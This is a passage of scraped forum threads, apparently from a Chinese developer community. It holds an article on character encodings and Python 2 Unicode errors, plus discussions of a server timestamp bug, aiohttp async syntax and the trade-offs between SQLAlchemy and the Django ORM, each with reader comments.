src=\"http://www.webopedia.com/FIG/EXT-ASC.gif\"></p>\n<p>众多的 ASCII 扩充字符集之间互不兼容，这样导致人们无法正常交流，例如 200 在 CP437 字符集表示的字符是 È ，在 ISO/8859-1 字符集里面显示的就是 ╚，于是国际标准化组织（ ISO ）及国际电工委员会（ IEC ）联合制定的一系列 8 位字符集的标准**ISO/8859-1(Latin-1)**，它继承了 CP437 字符编码的 128-159 之间的字符，所以它是从 160 开始定义的， ISO-8859-1 在 CP437 的基础上重新定义了 160~255 之间的字符。\n<img alt=\"iso8859-1\" src=\"http://7d9py7.com1.z0.glb.clouddn.com/ISO-8859-1.gif\"></p>\n<h3>多字节字符编码 GBK</h3>\n<p>ASCII 字符编码是单字节编码，计算机进入中国后面临的一个问题是如何处理汉字，对于拉丁语系国家来说通过扩展最高位，单字节表示所有的字符已经绰绰有余，但是对于亚洲国家来说一个字节就显得捉襟见肘了。于是中国人自己弄了一套叫 <strong>GB2312</strong> 的双字节字符编码，又称 GB0 ， 1981 由中国国家标准总局发布。 GB2312 编码共收录了 6763 个汉字，同时他还兼容 ASCII ， GB 2312 的出现，基本满足了汉字的计算机处理需要，它所收录的汉字已经覆盖中国大陆 99.75%的使用频率，不过 GB2312 还是不能 100%满足中国汉字的需求，对一些罕见的字和繁体字 GB2312 没法处理，后来就在 GB2312 的基础上创建了一种叫 GBK 的编码， GBK 不仅收录了 27484 个汉字，同时还收录了藏文、蒙文、维吾尔文等主要的少数民族文字。同样 GBK 也是兼容 ASCII 编码的，对于英文字符用 1 个字节来表示，汉字用两个字节来标识。</p>\n<h3>Unicode 的问世</h3>\n<p>GBK 仅仅只是解决了我们自己的问题，但是计算机不止是美国人和中国人用啊，还有欧洲、亚洲其他国家的文字诸如日文、韩文全世界各地的文字加起来估计也有好几十万，这已经大大超出了 ASCII 码甚至 GBK 所能表示的范围了，虽然各个国家可以制定自己的编码方案，但是数据在不同国家传输就会出现各种各样的乱码问题。如果只用一种字符编码就能表示地球甚至火星上任何一个字符时，问题就迎刃而解了。是它，是它，就是它，我们的小英雄，统一联盟国际组织提出了 Unicode 编码， Unicode 的学名是\"Universal Multiple-Octet Coded Character Set\"，简称为 UCS 。它为世界上每一种语言的每一个字符定义了一个唯一的字符码， Unicode 标准使用十六进制数字表示，数字前面加上前缀 U+，比如字母『 A 』的 Unicode 编码是 U+0041 ，汉字『中』的 Unicode 编码是 U+4E2D</p>\n<p>Unicode 有两种格式： UCS-2 和 UCS-4 。 UCS-2 就是用两个字节编码，一共 16 个比特位，这样理论上最多可以表示 65536 个字符，不过要表示全世界所有的字符显示 65536 个数字还远远不过，因为光汉字就有近 10 万个，因此 Unicode4.0 规范定义了一组附加的字符编码， UCS-4 就是用 4 个字节（实际上只用了 31 位，最高位必须为 0 ）。理论上完全可以涵盖一切语言所用的符号。</p>\n<h3>Unicode 的局限</h3>\n<p>但是 Unicode 有一定的局限性，一个 Unicode 字符在网络上传输或者最终存储起来的时候，并不见得每个字符都需要两个字节，比如字符“ A “，用一个字节就可以表示的字符，偏偏还要用两个字节，显然太浪费空间了。</p>\n<p>第二问题是，一个 Unicode 字符保存到计算机里面时就是一串 01 数字，那么计算机怎么知道一个 2 字节的 Unicode 字符是表示一个 2 字节的字符呢，例如“汉”字的 Unicode 编码是 U+6C49 ，我可以用 4 个 ascii 数字来传输、保存这个字符；也可以用 utf-8 编码的 3 个连续的字节 E6 B1 89 来表示它。关键在于通信双方都要认可。因此 Unicode 编码有不同的实现方式，比如： UTF-8 、 UTF-16 等等。 Unicode 就像英语一样，做为国与国之间交流世界通用的标准，每个国家有自己的语言，他们把标准的英文文档翻译成自己国家的文字，这是实现方式，就像 utf-8 。</p>\n<h3>具体实现： UTF-8</h3>\n<p>UTF-8 （ Unicode Transformation Format ）作为 Unicode 的一种实现方式，广泛应用于互联网，它是一种变长的字符编码，可以根据具体情况用 1-4 个字节来表示一个字符。比如英文字符这些原本就可以用 ASCII 码表示的字符用 UTF-8 表示时就只需要一个字节的空间，和 ASCII 是一样的。对于多字节（ n 个字节）的字符，第一个字节的前 n 为都设为 1 ，第 n+1 位设为 0 ，后面字节的前两位都设为 10 。剩下的二进制位全部用该字符的 unicode 码填充。</p>\n<p><img alt=\"code\" src=\"http://7d9py7.com1.z0.glb.clouddn.com/cd6c79db0291464c193de1b532ae890c_b.jpg\"></p>\n<p>以『好』为例，『好』对应的 Unicode 是 597D ，对应的区间是 0000 0800--0000 FFFF ，因此它用 UTF-8 表示时需要用 3 个字节来存储， 597D 用二进制表示是： 0101100101111101 ，填充到 1110xxxx 10xxxxxx 10xxxxxx 得到 11100101 10100101 10111101 ，转换成 16 进制是 e5a5bd ，因此『好』的 Unicode 码 U+597D 对应的 UTF-8 编码是 \"E5A5BD\"。你可以用 Python 代码来验证：</p>\n<pre><code>&gt;&gt;&gt; a = u\"好\"\n&gt;&gt;&gt; a\nu'\\u597d'\n&gt;&gt;&gt; b = a.encode('utf-8')\n&gt;&gt;&gt; len(b)\n3\n&gt;&gt;&gt; b\n'\\xe5\\xa5\\xbd'\n</code></pre>\n<hr>\n<p>现在总算把理论说完了。再来说说 Python 中的编码问题。 Python 的诞生时间比 Unicode 要早很多， Python2 的默认编码是 ASCII ，正因为如此，才导致很多的编码问题。</p>\n<pre><code>&gt;&gt;&gt; import sys\n&gt;&gt;&gt; sys.getdefaultencoding()\n'ascii'\n</code></pre>\n<p>所以在 Python2 中，源代码文件必须显示地指定编码类型，否则但凡代码中出现有中文就会报语法错误</p>\n<pre><code># coding=utf-8\n或者是：\n# -*- coding: utf-8 -*-\n</code></pre>\n<h3>Python2 字符类型</h3>\n<p>在 python2 中和字符串相关的数据类型有 str 和 unicode 两种类型，它们继承自 basestring ，而 str 类型的字符串的编码格式可以是 ascii 、 utf-8 、 gbk 等任何一种类型。</p>\n<p><img alt=\"python-str.png\" src=\"https://dn-mhke0kuv.qbox.me/524dbece9003248d928c.png\"></p>\n<p>对于汉字『好』，用 str 表示时，它对应的 utf-8 编码 是'\\xe5\\xa5\\xbd'，对应的 gbk 编码是 '\\xba\\xc3'，而用 unicode 表示时，他对应的符号就是 u'\\u597d'，与 u\"好\" 是等同的。</p>\n<h3>str 与 unicode 的转换</h3>\n<p>在 Python 中 str 和 unicode 之间是如何转换的呢？这两种类型的字符串之间的转换就是靠 decode 和 encode 这两个函数。 encode 负责将 unicode 编码成指定的字符编码，用于存储到磁盘或传输到网络中。而 decode 方法是根据指定的编码方式解码后在应用程序中使用。</p>\n<pre><code> #从 unicode 转换到 str 用 encode\n\n&gt;&gt;&gt; b  = u'好'\n&gt;&gt;&gt; c = b.encode('utf-8')\n&gt;&gt;&gt; type(c)\n&lt;type 'str'&gt;\n&gt;&gt;&gt; c\n'\\xe5\\xa5\\xbd'\n\n#从 str 类型转换到 unicode 用 decode\n\n&gt;&gt;&gt; d = c.decode('utf-8')\n&gt;&gt;&gt; type(d)\n&lt;type 'unicode'&gt;\n&gt;&gt;&gt; d\nu'\\u597d'\n</code></pre>\n<h3>UnicodeXXXError 错误的原因</h3>\n<p>在字符编码转换操作时，遇到最多的问题就是 UnicodeEncodeError 和 UnicodeDecodeError 错误了，这些错误的根本原因在于 Python2 默认是使用 ascii 编码进行 decode 和 encode 操作，例如：</p>\n<h4>case 1</h4>\n<pre><code>&gt;&gt;&gt; s = '你好'\n&gt;&gt;&gt; s.decode()\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nUnicodeDecodeError: 'ascii' codec can't decode byte 0xe4 in position 0: ordinal not in range(128)\n</code></pre>\n<p>当把 s 转换成 unicode 类型的字符串时， decode 方法默认使用 ascii 编码进行解码，而 ascii 字符集中根本就没有中文字符『你好』，所以就出现了 UnicodeDecodeError ，正确的方式是显示地指定 UTF-8 字符编码。</p>\n<pre><code>&gt;&gt;&gt; s.decode('utf-8')\nu'\\u4f60\\u597d'\n</code></pre>\n<p>同样地道理，对于 encode 操作，把 unicode 字符串转换成 str 类型的字符串时，默认也是使用 ascii 编码进行编码转换的，而 ascii 字符集找不到中文字符『你好』，于是就出现了 UnicodeEncodeError 错误。</p>\n<pre><code>&gt;&gt;&gt; a = u'你好'\n&gt;&gt;&gt; a.encode()\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nUnicodeEncodeError: 'ascii' codec can't encode characters in position 0-1: ordinal not in range(128)\n</code></pre>\n<h4>case 2</h4>\n<p>str 类型与 unicode 类型的字符串混合使用时， str 类型的字符串会隐式地将 str 转换成 unicode 字符串，如果 str 字符串是中文字符，那么就会出现 UnicodeDecodeError 错误，因为 python2 默认会使用 ascii 编码来进行 decode 操作。</p>\n<pre><code>&gt;&gt;&gt; s = '你好'  # str 类型\n&gt;&gt;&gt; y = u'python'  # unicode 类型\n&gt;&gt;&gt; s + y    # 隐式转换，即 s.decode('ascii') + u\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nUnicodeDecodeError: 'ascii' codec can't decode byte 0xe4 in position 0: ordinal not in range(128)\n</code></pre>\n<p>正确地方式是显示地指定 UTF-8 字符编码进行解码</p>\n<pre><code>&gt;&gt;&gt; s.decode('utf-8') +y\nu'\\u4f60\\u597dpython'\n</code></pre>\n<h3>乱码</h3>\n<p>所有出现乱码的原因都可以归结为字符经过不同编码解码在编码的过程中使用的编码格式不一致，比如：</p>\n<pre><code># encoding: utf-8\n\n&gt;&gt;&gt; a='好'\n&gt;&gt;&gt; a\n'\\xe5\\xa5\\xbd'\n&gt;&gt;&gt; b=a.decode(\"utf-8\")\n&gt;&gt;&gt; b\nu'\\u597d'\n&gt;&gt;&gt; c=b.encode(\"gbk\")\n&gt;&gt;&gt; c\n'\\xba\\xc3'\n&gt;&gt;&gt; print c\n��\n</code></pre>\n<p>utf-8 编码的字符‘好’占用 3 个字节，解码成 Unicode 后，如果再用 gbk 来解码后，只有 2 个字节的长度了，最后出现了乱码的问题，因此防止乱码的最好方式就是始终坚持使用同一种编码格式对字符进行编码和解码操作。</p>\n<p><img alt=\"decode-encode\" src=\"http://7i7hhc.com1.z0.glb.clouddn.com/encode-decode.jpg\"></p>\n<p>声明：本文同时发布在微信公众号『一个程序员的微站』（ id:VTtalk ）公众号主要分享一些自己平常工作中总结的内容，考虑到公众号覆盖范围非常窄，因此发布在 V 站，希望更多的朋友可以看到，感谢你阅读到这里。</p>\n<p><img alt=\"weixin\" src=\"https://pic3.zhimg.com/v2-908866b3a4bce9edc4f15f89d312351e_b.png\"></p>\n</div></div>"], "reply": "23", "tittle": "说说 Python 字符编码的二三事", "comment": ["好文\r", "\r", "同样地道理  同样的道理", "支持。", "好文！", "我也写过一篇文章，可以一起参考。\r", "\r", "\r", "\r", "多出来的内容包括：\r", "- 在 REPL 打印 Unicode 字符\r", "- 常见的需要做编码的场景示范代码\r", "- 系统环境变量对 python 编码的影响", "写的很赞，明了易懂，赞！", "写的好清楚，能再补充下 python2 和 3 的不同点吗？主要用 3😁", " 好的，下次补充一个关于 2 与 3 对字符处理的区别", " 厉害了，我的哥。纯英文，方便老外", "谢谢，分析全面。学习了", "我也研究过字符编码，不过是在 C/C++, Java, JS 中。下面说一下我的理解：\r", "在 C/C++中的 char 类型或 wchar_t 类型，都是“假字符类型”，除了 ASCII 码是靠得住的，超过部分就取决于源文件的编码。\r", "在 Java,JS 中是“真字符类型”，无论源文件用什么编码存储，其内部都是用 UCS-2 存储的，当然也有局限性，就是汉字扩展 B,C,D,E 区的字被当作两个字了。\r", "另外乱不乱码还要看操作系统环境， Windows 设置 Codepage, Linux 默认是 UTF-8.\r", "\r", "关于汉字的编码， UTF-8,UTF-16LE 等编码之间都是有规律可以转化的，而要转成 GB,GBK 则没有规律，可以用 iconv 转化", " 其实 python3 默认编码改成 utf-8 之后，就少了很多 unicodexxxError 的东西了，主要问题集中在 windows 平台下 gbk 编码与 python 的 utf-8 编码转换的时候可能会出现乱码的情况，就像楼主最后一个例子中所说的。", "谢谢，学习一下", " Java 遇到的乱码最多的就是刚开始学 javaweb 的时候，各种乱，归根到底还是对字符编码理解不透，只知道所有地方（ IDE 的设置， jsp 文件，数据库编码设置，还有浏览器网页等等）保持一致的编码就不会有问题了", " 对的。主要问题是 win 下 cmd 默认编码 gbk （其实是 mbcs ）。", "\r", "3 确实少了很多编码问题，最近升级到 3.6 好像以前 powershell 下乱码的现在也能正常输出", "GBK 并未收录少数民族语言文字，推荐在可能的情况下使用 GB18030 代替 GBK", "最后一个例子解释得不对吧？觉得应该是 unicode 的 b 通过 gbk 得到了 c ，但是文件声明用 utf-8,导致在 print 的时候，试图用 utf-8 去解码一个 gbk 的字符串，导致了错误", " 谢谢指正", "请求楼主，爬虫如何避免乱码", "自从不用 Windows 之后，就再也没有遇到过字符集的问题了，除了写爬虫的时候少数网站网页字符集不是用 utf-8 的。", " 所以，每个开发者都需要一台 Mac :)", " 这个问题需要根据具体的错误去分析，通常理解了字符编码的原理之后，基本上就能自己排查问题了", "想问一下怎么确定目标字符串的编码，我用了 chardet 检测，某些中英混合的检测好像不是很准确，比如： MUJI 無印良品 会检测到{'confidence': 0.31101204298947943, 'encoding': 'ISO-8859-2'}这种\r", "不处理的话在 WINDOWS 下就是正常显示， centos 上就乱码，尝试先解成 unicode 无果……"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>环境：阿里云 ubuntu14.04</p>\n<p>过年期间服务器没有任何升级操作过，然后昨天部分用户反应新提交的数据前端一直显示不出来，检查了很久，还担心过年期间被黑客 rm -rf 玩过呢。</p>\n<p>后来检查数据库里的这个数据有保存，但是时间戳居然不对！默认值一直是 datetime.utcnow ，一部分用户登录日志的 datetime.utcnow 记录是准确的 2017-02-08 ，有一部分数据库里存下来的时间戳是 2017-01-29 ！大惊！\n（因为返回给用户的数据有按时间戳过滤，所以 2017-01-29 的数据就显示不出来）</p>\n<p>然后重启一下应用，就又好了，现在就没有机会在去复盘这个错误了。<br>\n这个毛病会是可能出在什么地方呢？</p>\n</div></div>"], "reply": "5", "tittle": "遇到一个非常诡异的时间戳故障问题。", "comment": ["服务器全部做了时间同步了？", " 没有啊，阿里云上 ECS 也要手动同步吗？\r", "\r", "咦，怎么 knightdf 回复的我没有未读提醒(⊙o⊙)  @", " 我账号被降权过了吗？很莫名啊", "阿里云应该要同步，我阿里云上是 arch, 开始时候没有装 ntpd ，就遇到时间不对的问题……", " 一般的云服务器都需要自己做 ntp update 的，我们的集群都是定时同步的", " \r", " \r", "\r", "我说呢，谢谢建议！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题，网上教程看的一头雾水。\n希望大家推荐下这方面写的好的书籍或者 Blog 和文章等等。\n谢谢大家！</p>\n</div></div>"], "reply": "17", "tittle": "最近想学习 Python 的迭代器、装饰器、生成器、和闭包等内容。求老司机推荐推荐学习资源。", "comment": [" 非常感谢！", "Fluent Python ，比你想要的还要深入！！", " 谢了 估计刚开始看不懂。有循序渐进的么", "推荐两篇文章\r", "理解 Python 装饰器看这一篇就够了： ", " \r", "完全理解 Python 迭代对象、迭代器、生成器 ： ", "廖雪峰教程，不过不是仅针对这几个方面", " 非常感谢！", "提供一些资源供参考 ", " #5 好文章 收藏了", "能推下？ ", "\r", "\r", "、、逃", "Expert Python Programming 也可以，二版也在翻译中 ", "马克", "官方文档，廖雪峰的博客", "边实践边理解，可以看看我的 Github ： ", " awesome thanks ！", "我记得这几点我都是现学现用的。。因为看源码看到这些内容，就去 Google 搜，然后把源码看懂。如果楼主有面向对象思维的话应该更容易理解"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>参照<a href=\"http://aiohttp.readthedocs.io/en/stable/client.html\" rel=\"nofollow\">aiohttp 官网的教程</a>，写了个示例，发现语法报错。</p>\n<pre><code>import asyncio\nimport aiohttp\nasync with aiohttp.ClientSession() as session:\n    async with session.get('https://api.github.com/events') as resp:\n        print(resp.status)\n        print(await resp.text())\n-------------\n  File \"/Users/zed/PycharmProjects/example/used_aiohttp/1.py\", line 3\n    async with aiohttp.ClientSession() as session:\n             ^\nSyntaxError: invalid syntax\n</code></pre>\n<p>现在是不支持这样的写法了吗</p>\n<pre><code>async with xxxxx as xxxx:\n    pass\n</code></pre>\n</div></div>"], "reply": "11", "tittle": "Python 协程 BUG？", "comment": ["得用 async def xxx(): 包起来", " 包起来是可以的\r", "但是看官网的示例是这么写的，还以为是我的姿势不对。。", "![]( ", ")", "![]( ", ")\r", "?", "![]( ", ")", "```\r", "import asyncio\r", "import aiohttp\r", "\r", "async def fetch():\r", "    async with aiohttp.ClientSession() as session:\r", "        async with session.get('https://api.github.com/events') as r:\r", "            print(r.status)\r", "            print(await r.text())\r", "    \r", "loop = asyncio.get_event_loop()\r", "loop.run_until_complete(fetch())\r", "loop.close()\r", "```\r", "我估计官网是默认你会用 asyncio", "原来回复不能用 markdown", "其实我觉得挺需要一个 apython 直接在 async def 环境内执行. py 文件", "要写在 async def 内"]},
{"content": ["<div class=\"topic_content\">'#{% for items in comments %}',\r<br>                        '#{% if loop.index &gt; 2 %}',\r<br>                        '#{% break %}',\r<br>                        '#{% endif %}',\r<br>                        '&lt;li&gt;',\r<br>                        '&lt;a class=\"_4zhc5 _iqaka\" title=\"#{items.username}\" href=\"/profile/#{items.user_id }\" \r<br>                        '#{items.username}',\r<br>                        '&lt;/a&gt;',\r<br>                        '&lt;span&gt;',\r<br>                        '&lt;span&gt;',\r<br>                        '#{items.content}',\r<br>                        '&lt;/span&gt;',\r<br>                        '&lt;/span&gt;',\r<br>                        ' &lt;/li&gt;',\r<br>                        '#{% endfor %}',</div>"], "reply": "1", "tittle": "使用 js 生成模板读取 json 中的内容的时候读取不出来", "comment": ["{\r", "    \"has_next\": true,\r", "    \"images\": [\r", "        {\r", "            \"head_url\": \"http://images.nowcoder.com/head/710m.png\",\r", "            \"comment_count\": 3,\r", "            \"user_id\": 100,\r", "            \"created_date\": \"2017-01-19 14:22:51\",\r", "            \"url\": \"http://images.nowcoder.com/head/603m.png\",\r", "            \"user_name\": \"User100\",\r", "            \"id\": 994,\r", "            \"comments\": [\r", "                {\r", "                    \"username\": \"User100\",\r", "                    \"content\": \"This is a comment0\",\r", "                    \"user_id\": 100\r", "                },\r", "                {\r", "                    \"username\": \"User100\",\r", "                    \"content\": \"This is a comment1\",\r", "                    \"user_id\": 100\r", "                }\r", "            ]\r", "        },\r", "        {\r", "            \"head_url\": \"http://images.nowcoder.com/head/710m.png\",\r", "            \"comment_count\": 3,\r", "            \"user_id\": 100,\r", "            \"created_date\": \"2017-01-19 14:22:51\",\r", "            \"url\": \"http://images.nowcoder.com/head/972m.png\",\r", "            \"user_name\": \"User100\",\r", "            \"id\": 993,\r", "            \"comments\": [\r", "                {\r", "                    \"username\": \"User100\",\r", "                    \"content\": \"This is a comment0\",\r", "                    \"user_id\": 100\r", "                },\r", "                {\r", "                    \"username\": \"User100\",\r", "                    \"content\": \"This is a comment1\",\r", "                    \"user_id\": 100\r", "                }\r", "            ]\r", "        },\r", "        {\r", "            \"head_url\": \"http://images.nowcoder.com/head/710m.png\",\r", "            \"comment_count\": 3,\r", "            \"user_id\": 100,\r", "            \"created_date\": \"2017-01-19 14:22:51\",\r", "            \"url\": \"http://images.nowcoder.com/head/151m.png\",\r", "            \"user_name\": \"User100\",\r", "            \"id\": 992,\r", "            \"comments\": [\r", "                {\r", "                    \"username\": \"User100\",\r", "                    \"content\": \"This is a comment0\",\r", "                    \"user_id\": 100\r", "                },\r", "                {\r", "                    \"username\": \"User100\",\r", "                    \"content\": \"This is a comment1\",\r", "                    \"user_id\": 100\r", "                }\r", "            ]\r", "        }\r", "    ]\r", "}"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近看了一下 SQLAlchemy 的文档, 感觉大致的使用方式跟 Django ORM 很像(包括 Peewee 之类都很像), 就是细节上感觉有点拧巴, 不如 Django 的 ORM 那么自然. 那 SQLAlchemy 相比有哪些优势呢? 谢谢大家.</p>\n</div></div>"], "reply": "48", "tittle": "SQLAlchemy 比 Django 自带的 ORM 好在哪里?", "comment": ["我用过 php 下各种框架得 orm 之后觉得 python 下的 orm 都很拧巴。。。", "早年没靠谱 orm 的时候（暴露年龄了），点了太多技能点在写 sql 上，之后觉得所有的 orm 都很拧巴。。。", "说几个 django orm 坑爹的地方。\r", "1. 有些 group by 无法用 orm 实现。\r", "2. 有些连表查询，用 djanog orm 写出来的 sql 是子查询。\r", "3. 速度感人，一个两万条记录的查询，用时三秒。 sql<100ms\r", "\r", "1 和 2sqlalchemy 有很好的解决方案。\r", "3 我不确定 sqlalchemy 是更快还是更慢。", "还有 django orm 如法实现分表。至少原生不支持。只能分区。\r", "sqlalchemy 支持。", " 感谢具体的体验和回复", " 所以推荐原生 SQL ，还是 ORM 呢？", " 该用 orm 还是得用 orm 毕竟方便。一直都用 sql 有两个问题，一个是预防 sql 注入，另一个是代码不易读。", " 毕竟是世界上最好的语言。", "sqlalchemy 怎么评价呢，首先说，功能完善整齐\r", "\r", "然后就是 1 楼所说的，拧巴！没错！有的时候真行想自己去撸 sql 。。 orm 是一种思维和开发的负担。难写难维护难调试\r", "\r", "\r", "sqlalchemy 的问题，用一句话表示：\r", "\r", "from sqlalchemy.orm import joinedload, Load, load_only\r", "\r", "你看，这里面包含了不含下划线全小写风格，驼峰风格，下划线风格三种 style 。真是玩死你系列。", "ActiveRecord 路过。。", "没用过 SQLAlchemy ，不是很了解。\r", "很早之前简单的了解过 SQLAlchemy ，从 API 的友好度上看 Django 的 ORM 比 SQLAlchemy 好很多（个人看法）。\r", "Django 的 ORM 调优其实并不是很难，很多时候慢是因为用的不对（糟糕的 SQL 一样慢）。\r", "当然，在极少数情况下还是会出现 ORM 无能为力的情况，这时候可以直接写 SQL 。 ORM 和 SQL 并不冲突。为了这 0.x%的情况而放弃使用 ORM 很没必要。\r", " \r", "1. Django 的查询可以嵌入 SQL ，也可以把自己手写的 SQL 绑定到对象上。\r", "不知道你遇到的具体情况是怎么样的，不过在我看来第一条应当是可以实现。\r", "2. 有些表连接写出来是子查询，这个需要结合具体案例，不是很确定是否是写法问题。\r", "3. 2w 条数据查询用时 3 秒，这个非常不正常，需要结合具体代码进行分析。从我主观角度看是代码写的有问题。", "以前只用 SQLAlchemy 现在用 Peewee 感觉 API 更友好", "我和你的感觉是一样的, Django 的 ORM 的易读性比 peewee 好一圈, peewee 的易读性比 SA 好两圈或更多...", "  peewee 坑多。主要与原因是 too young\r", "\r", " 赞同。\r", "\r", "django 的 orm 其实挺好的。应付 90% 的逻辑没问题，读起来改起来都比 sql 容易太多。", "sqlalchemy 硬着头皮用了一段时间，实在研究不下去，改用 peewee 了。\r", "用 peewee ，哪里碰到了问题直接去查源码，主体就一个 python 文件，感觉代码思路很清晰，碰到的大部分问题都得以解决了。\r", "用 sqlalchemy 的时候想查源码都查不出个头绪来", " 个人曾经想过把 Django 的 ORM 完全剥离出来，这样就可以脱离 Django 使用，后来看到 peewee 就放弃了...   不是说它做得有多好，不过至少是存在了.", "sqlalchemy 很多语言都有实现，换语言，换库都能直接上手。", " 那是 PEP8 规定的命名方式", " \r", " \r", "1. Django 的查询可以嵌入 SQL ，也可以把自己手写的 SQL 绑定到对象上。 \r", "不知道你遇到的具体情况是怎么样的，不过在我看来第一条应当是可以实现。\r", "====\r", "django orm 是有 extra 的写法，不过我把这种写法归于直接 sql 一类。（也是我个人观点） \r", "2. 有些表连接写出来是子查询，这个需要结合具体案例，不是很确定是否是写法问题。 \r", "3. 2w 条数据查询用时 3 秒，这个非常不正常，需要结合具体代码进行分析。从我主观角度看是代码写的有问题。\r", "====\r", "非常简单 <model>.objects.all().values() 三秒\r", "<model>.objects.filter(<这里假设出 10000 条数据>).values() 一秒\r", "直接用客户端查询 select * from <table name> <100ms\r", "\r", "我的理解问题出在 django orm 在生成映射结构的时候多处使用 for 循环导致的这个问题。", " 不给 ORM 翻译出来的 SQL 就和裸 SQL 比较性能并猜测原因略有些耍流氓...", " \r", "你可以再测试一下，<model>.objects.all().values() 绝对花不了 1 秒。\r", "Django 的 QuerySet 是 Lazy 的，只有在你用的时候才会发生查询。\r", "单纯执行上面的语句不会执行 SQL 。\r", "如果你的写法是\r", ">>> qs = <model>.objects.all().values()\r", ">>> list(qs)\r", "超过 1s 是很正常的，因为你要把所有数据一次性取出来。你可以用调试工具看一下，生成的 SQL 就是`select * from <table name>`，查询速度本身是非常快的，但单 2w 条数据，别的不说，单网络传输都要费不少时间。\r", "\r", "使用 Django 的 ORM ，如果慢的不正常，用调试工具看一下生成的 SQL ，通常都可以解决。所谓必须写 SQL 的地方极少。注：\r", "- 部分复杂报表，查询速度慢，用 ORM 性能优化有些难做。\r", "- 需要用到数据库专有特性， Django 不支持，需要用 extra 内嵌少量 SQL 。", "SA 不适合初学者，以及一直用一种数据库的开发者。要驾驭好必须对 rmdb 有一定程度的认识，为了在不同数据库间充分利用他们的特性，并提供一致的接口， SA 没少下功夫，所以代码比其他 ORM 难读。 SA 不仅仅是 ORM 。", "我只想说 SQLAlchemy 生成真正的 SQL 语句那就是灾难，性能的坑太多了。。。我觉得还是自己撸个简单的 ORM 比较好，我最新的项目就是这么干的， sql 执行效率杠杠的", "直接手写 SQL 运行速度比 ORM 快很多", "Django 的 ORM 事务和多库支持简直鸡肋。。。", " \r", "对,是我没说清楚.\r", "我就是这个意思\r", ">>> qs = <model>.objects.all().values() \r", ">>> list(qs) \r", "超过 1s 是很正常的，因为你要把所有数据一次性取出来。你可以用调试工具看一下，生成的 SQL 就是`select * from <table name>`，查询速度本身是非常快的，但单 2w 条数据，别的不说，单网络传输都要费不少时间。 \r", "\r", "你的意思是说,(超过 1s 是很正常的)这一秒钟时间并不是 orm 引起的?", " 多库还行啊...用 db_router...", " 要么是因为你水平到位了.要么是因为项目刚开始没多长时间.等将来业务变动自己撸的就扛不住了.\r", "我为什么这么说?\r", "以为我这么干过.(逃.", " \r", "对 1s 很正常，和 ORM 没关系。\r", "如果有 100w 条数据，你 list(qs)就不是慢的问题，内存会直接爆掉。\r", "你执行 SQL ，实际上只是拿到一个游标，并没有立即将所有数据全部取出来。\r", "你的 list(qs)实际上是一次性将数据全部取出丢到 list 里，不慢才怪。", "我觉得任何 orm 都很拧巴。。\r", "\r", "本来把多维数据放进二维的表就够受得了，完了之后各种 sql 查询特性还支持不齐。遇到一种新的子句就要看看文档怎么实现，不同框架还不一样，难受死了。", " \r", "\r", "pep 没问题，但是你写 orm 语句就蛋痛了。\r", "\r", "还是 django 或者 peewee 那种链式调用写起来舒服。\r", "\r", "sqlalchemy 的 .option() 各种复杂结构，各种 func 太复杂了。不值得花那么多精力去抽象。 orm 本来就一种 dsl 了， sqlalchemy 是 dsl 里再发明一个 dsl 。\r", "比如 primaryjoin=\"and_(xxx=yyy)\" 这种简直丑得不要不要的。", " \r", "部分认同你的观点:\r", "import MySQLdb\r", "\r", "# Open database connection\r", "db = MySQLdb.connect(<略>)\r", "\r", "import time\r", "starttime = time.time()\r", "sql0 = \"select * from <略>\"\r", "cursor = db.cursor(MySQLdb.cursors.DictCursor)\r", "cursor.execute(sql0)\r", "custom_html_data = cursor.fetchall()\r", "print time.time() - starttime\r", "cursor.close()\r", "\r", "我这边输出的结果在 1.6 ~ 1.7 秒之间.\r", "吃掉的那 1.3 秒就是 orm 的损耗.\r", "\r", "这里有一个不严谨的地方就是,我没有测试当前时间点 django orm 的效率.\r", "\r", "最后还有一个问题,如果这种时间的损耗都可以忽略的话,大家所说的 ORM 影响效率的点在哪里呢?", " 那是因为 SA 支持的 DB 种类更多，而且把 ORM 和 Expression 分别抽象再组合，有时可以只用 Expression ，能力上 SA 比 Django 更为全面和强大", "看了以上评论觉得果然还是 ruby 的 ActiveRecord 好用啊！", "肤浅的认为 sqlalchemy 并没有 django 的 orm 好，是真的好难用啊，文档也乱七八糟的感觉，每次都得去看源码，有人用估计也是在不用 django 的时候 orm 方案上早期没有太多的选择，看了 peewee 的文档后觉得 peewee 的文档结构够清楚，明确的要求 connect 和 close ，很方便就实现了自动 reconnect ，轻松两行代码就可以做到主从的读写分离，用 pwiz 还可以把已有的表自省生成 model ，感觉使用 peewee 才是 python orm 正确的选择，还有 records 也不错的样子，暂时还没有在项目里用过，说的是 SQL for Humans ：）", "有没有人告诉我，什么是拧巴", "看到楼上有人说 SQLAlchemy 支持的 DB 更多, 先假定这是对的. 但感觉并没什么用啊. 一般应用数据库选型定了一种后很少会换, 支持主流的 MySQL, PostgreSQL, Oracle 就可以了吧, 再多也没什么用.", "哈，原来 peewee 用户挺多的", "records 是基于 sqlalchemy 的", "Python 里的 AR 实现： ", "还是 SQLAlchemy 功能完善，即使只是拼 SQL ，比如\r", "sa.func.date(Model.c.created_at.op('AT TIME ZONE')(tz))\r", "\r", "一些较新的特性，比如 hstore 、 json 之类也是 SQLAlchemy 支持好", " 你好，想请教下 SqlAlchemy 的分表实现方法。 \r", "\r", "我现在是用 automap_base 来反向映射的表结构。", " 我也不会,只是又一次参加 pycon 年会的时候 达达的 rest api 负责人在做分享的时候讲到过.\r", "你可以搜搜 2016 python 上海 网上能找到视频和 ppt 以及 github.", " 我自己写了 ORM 后，觉得不如 SQLAlchemy 功能多，于是我就用 sqla 了。但是 sqla 比我自己写的 orm 臃肿。谁让它功能多呢？\r", "\r", "还有我要说说，很多游戏开发里面都用到了类似于 SQL ORM 的思想。什么 post connect, reconnect, 之类的都有。\r", "\r", "我觉得， ORM 在于思想问题。 django 自带的 ORM 跟 django 本身镶嵌太密切了，定制性能不好。当然如果你是 rich 的人，全上 django ，多花钱整机器也行。可以参考 instagram 。 sqla 的案例就更多了，什么 reddit ， yelp 等等。\r", 